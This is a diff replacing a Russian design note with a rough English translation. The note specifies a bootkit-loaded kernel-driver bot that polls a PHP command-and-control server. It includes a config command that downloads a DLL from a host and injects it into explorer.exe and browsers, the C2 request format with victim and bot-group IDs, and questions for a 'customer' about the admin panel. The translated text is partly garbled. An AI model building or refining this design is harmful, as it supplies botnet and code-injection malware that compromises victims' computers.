@@ -1,45 +1,52 @@
-Кернельный бот
+Kernel bot
 
-В данный момент реализован следующий функционал:
-Бот представляет собой драйвер, загружаемый посредством буткит-лоадера. Драйвер содержит свой TCP\IP стек и 
- реализацию HTTP. После инициализации бот создает таймер, по которому обращается (посредством HTTP) на 
- заданный URL, указывающий на PHP скрипт, который возвращает конфиг-файл. В конфиге содержатся команды типа: 
-  "DLL: http://myhost.com/myfile.dll, file1.dll, explorer.exe iexplore.exe firefox.exe"
- Бот скачивает (через HTTP) файл myhost.com/myfile.dll, сохраняет его на VFS как file1.dll, и регистрирует
- file1.dll для автоматического инжекта в процессы: explorer.exe, iexplore.exe, firefox.exe.
+Currently implemented the following functionality:
 
-Что необходимо для дальнейшей разработки:
+Bot is a driver that is loaded by the bootkit-loader. The driver contains a TCP \ IP stack and implementation of HTTP. 
+After initialization, the bot creates a timer that turns (via HTTP) to specified URL, pointing to a PHP script that returns the config file. 
 
-1. Согласовать формат конфиг-файла
-Сейчас используется обычный текстовый файл, описанный выше.
-Возможно, есть смысл добавить в конфиг-файл такие параметры как: список серверов для получения конфига, строка
- (скрипт и параметры) для обращения за конфигом, период обращения за конфигом. Что-то еще?
-Возможно, стоит использовать конвертор (конфигуратор) для преобразования текстового конфиг-файла в  
- определенный формат, с целью убрать парсер текста из бота, что уменьшит его размер и снизит вероятность
- ошибок.
-Формат команд: Команды для добавления DLL на загрузку, для удаления DLL, для обновления и тп. Команды для
- работы с драйверами?
+The config file contains commands such as:
 
-2. Согласовать формат запроса конфига
-Сейчас бот работает с нашим тестовым сервером, формат запроса следующий:
+"DLL: http://myhost.com/myfile.dll file1.dll explorer.exe iexplore.exe firefox.exe"
+
+Bot downloads (over HTTP) file myhost.com/myfile.dll, stores it on how VFS file1.dll, and registers file1.dll for automatic injection produce in the process: explorer.exe, iexplore.exe, firefox.exe.
+
+What is needed for further development:
+
+1. To approve the format config file
+
+Who uses a plain text file described above. Perhaps it makes sense to add to the configuration file parameters 
+such as the server list for config line (Scripts and settings) to apply for a configuration file, the period of revolution of the config. 
+
+something else?
+
+You may want to use a converter (configurator) for converting a text configuration file to 
+specific format in order to remove the text from parser bot that will reduce its size and reduce the likelihood of errors.
+Format commands: Commands for adding a DLL to load, to remove the DLL, to update and. Commands work with the drivers ?:
+
+2. To approve the request format config
+
+Now the bot works with our test server, the request format is as follows:
+
 GET /config.php?version=100&user=1234&server=1&id=1000&crc=3201b37f
-где: version - версия бота, user - уникальный ID клиента, server - ID сервера, id - группа бота, crc - CRC32 
- предыдущего конфига (используется для того, чтобы не выдавать один конфиг повторно)
 
-что нужно изменить:
-- тип запроса: GET или POST ?
-- имя скрипта, возвращающего конфиг
-- параметры скрипта: ID клиента, Версия бота, ID сервера, CRC32 предыдущего конфига, что-то еще?
-- доп. параметры HTTP запроса: версия и архитектура ОС (User-Agent), Referer, что-то еще?
-- ?
+where: version - version of the bot, 
+user - a unique client ID, 
+server - ID server, 
+id - Group bot, 
+crc - CRC32
 
-3. Что-то еще, что я не учел?
+previous config (used to not issue a re-configuration)
 
+you need to change:
+- The type of request: GET or POST?
+- The name of the script that returns configuration
+- The parameters of script: ID of the client, the bot version, ID server, CRC32 previous config, something else?
+- Ext. HTTP request parameters: the operating system version and architecture (User-Agent), Referer, 
 
-Если у заказчика уже есть работающий сервер с админкой, позволяющий выдавать конфиги, то прошу предоставить
-- описание формата конфига
-- описание пртокола взаимодействия
-также, прошу дать временный доступ к серверу, для доработки бота под протоколы заказчика, и последующего
- тестирования.
+3. Something else I did not realize ?
 
+If a customer is already working with the admin server , allowing config issue , then please give
 
+- A description of the format of the configuration
+- A description of the interaction also, please give temporary access to the server, to finalize the bot client protocols ,and subsequent testing.
